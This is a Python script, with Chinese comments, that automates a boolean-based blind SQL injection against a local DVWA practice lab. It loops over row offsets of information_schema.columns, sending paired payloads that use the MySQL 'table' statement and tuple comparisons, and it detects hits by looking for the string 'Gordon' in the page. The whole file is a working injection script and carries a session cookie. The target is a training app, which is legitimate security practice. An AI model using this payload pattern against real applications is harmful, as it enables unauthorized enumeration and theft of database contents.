import requests
url = "http://192.168.1.221/dvwa_test/vulnerabilities/sqli/?"

for i in range(3500, 3600):
    params1={"id":"2' and  (table information_schema.columns limit {},1) >=('def','dvwa','users',' ','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)-- ".format(i),"Submit":"Submit"}
    params2={"id":"2' and  (table information_schema.columns limit {},1) <=('def','dvwa','users','z','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)-- ".format(i),"Submit":"Submit"}
    #使用两次查询，防止第一个参数的查询就影响结果，从而无法比较真正相比较的参数
    #由于记录中有NULL，需要在NULL前设置防止NULL参加比较造成查询结果为NULL
    header = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-encoding": "gzip, deflate",
        "accept-language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "connection": "close",
        "cookie": "experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltRmpOMlZpWVdFNExUTTVNRFl0TkRnd05DMDRNRFl6TFRnMFlXSTRaRGhoTURFMVlpST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--fa61bc8250f428fab74992fe3b6e868f5908d932; sidebar_collapsed=false; PHPSESSID=er8hio283j113obiietcrkugt7; security=low",
        "host": "192.168.1.221",
        "referer": "http://192.168.1.221/dvwa_test/vulnerabilities/sqli/",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    
    #r1 = requests.get(url=url+payload1, headers=headers)  直接将payload添加到url中不行 需要进行url编码
    r1 = requests.get(url,params=params1,headers=header)
    r2 = requests.get(url,params=params2,headers=header)
    
    # print(r1.text)
    if "Gordon" in r1.text and "Gordon" in r2.text:  #不要用admin  因为页面最左下角就有admin 使用admin登陆的
        print("字段所在索引为:",i)